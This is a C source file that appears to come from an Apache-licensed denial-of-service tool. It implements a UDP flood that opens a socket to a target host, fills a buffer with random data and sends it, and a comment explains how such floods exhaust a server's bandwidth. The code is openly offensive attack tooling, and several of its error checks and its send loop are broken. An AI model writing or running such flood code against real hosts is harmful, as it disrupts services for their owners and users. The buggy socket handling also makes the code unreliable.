// Copyright [2016] [hoenir]
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//    http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <lib/conn.h>
#include <lib/info.h>
#include <lib/mem.h>
#include <lib/util.h>

#include "flood.h"

// flood_setup4 fill up the conn4_t structure with the coresponding
// information in order to fully bind the udp socket at a given host
void flood_setup4(conn4_t *conn, const char *host)
{
	if (!conn)
		INFOEE("Empty ipv4 conn pointer, please pass a non null conn");

	if (!host)
		INFOEE("Empty host, cand set up the udp conn");

	uint16_t port		   = port_random();
	conn->addr->sin_family = AF_INET;
	conn->addr->sin_port   = htons(port);
	// we don't need the extra check because at the begining
	// we already parsed host to check if it's valid or not.
	inet_pton(AF_INET, host, &conn->addr->sin_addr);
	conn->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (!conn->sock)
		INFOEE("Could not create the upd socket");

	if (!connect(conn->sock, (SA*)&conn->addr, sizeof(conn->addr)))
		INFOEE("Could not connect the udp socket");

	conn->buff = xzmalloc(PK_SIZE * sizeof(conn->buff));
	for (int i = 0; i < PK_SIZE; i++)
		// fill up the buffer with random data.
		urandom_bytes(&conn->buff[i], sizeof(conn->buff[i]));
}

void flood_attack4(conn4_t *c)
{
	ssize_t n = 0;
	
	STATUS("Guns are ready... Fire !");
	for (size_t i=0; i<1; i++) {
		n = send(c->sock, c->buff, PK_SIZE * sizeof(c->buff), 0);
		if (!n) {
			WSTATUS("Could not send udp packet ...");
			break;
		}
		printf("Send packet of size %lu\n", n);
		printf("Send this pkg %s\n", c->buff);
	}
}

/*
 * Udp flood
 *
 * User Datagram Protocol(UDP) is a connectionless
 * protocol that uses datagrams embeddded in IP packets for
 * communication without needing to create a session between two devices
 * (and therefore requiring no handshake process). A UDP Flood attack
 * does not exploit a specific vulnerability, but rather simply abuses 
 * normal behaviour at a high enough level to cause network
 * congestion for a targeted network. It consists of sending a large number
 * of UDP datagrams from petentially spoofed IP addresses to random
 * ports on a target server; the server reciving this traffic is unable
 * to process every request, and consumes all of it's bandwidth
 * attempting to send ICMP "destination unreachable" packet replies to
 * confirm that there was no application listening on the target ports.
 * As a volumetric attack, a UDP flood is measured in Mbps(bandwidth)
 * and PPS(packets per second).
 *
 * udp_flood
 *
 * this is the entry function where the args will pe parsed
 * and start the attack.
 *
 */
void flood(conn_t *conn)
{
	flood_attack4(conn->c4);
}
